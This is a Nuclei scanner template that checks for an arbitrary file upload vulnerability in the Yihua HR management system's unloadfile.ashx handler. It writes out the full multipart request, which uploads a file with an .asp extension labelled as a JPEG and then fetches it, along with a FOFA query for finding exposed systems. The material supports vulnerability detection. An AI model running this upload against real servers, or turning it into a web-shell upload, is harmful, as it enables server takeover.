id: euesoft-unloadfile-fileupload
info:
  name: 亿华人力资源管理系统 unloadfile.ashx - fileupload
  author: leadlife
  severity: critical
  description: 亿华人力资源管理系统unloadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限
  reference: 
    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E4%BA%BF%E5%8D%8E%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Funloadfile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: body="亿华人力资源管理系统"
  tags: euesoft,fileupload

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /handle/unloadfile.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin

        -----------------------------21909179191068471382830692394
        Content-Disposition: form-data; name="file"; filename="{{num}}.asp"
        Content-Type: image/jpeg

        {{num}}
        -----------------------------21909179191068471382830692394
        Content-Disposition: form-data; name="action"

        unloadfile
        -----------------------------21909179191068471382830692394
        Content-Disposition: form-data; name="filepath"

        ./
        -----------------------------21909179191068471382830692394—
      
      - |
        GET /{{filename-upload}} HTTP/1.1
        Host: {{Hostname}}
    
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "contains(body_1,'成功上传')"
        condition: and

# use this poc we need debug nuclei to get uploadfile path
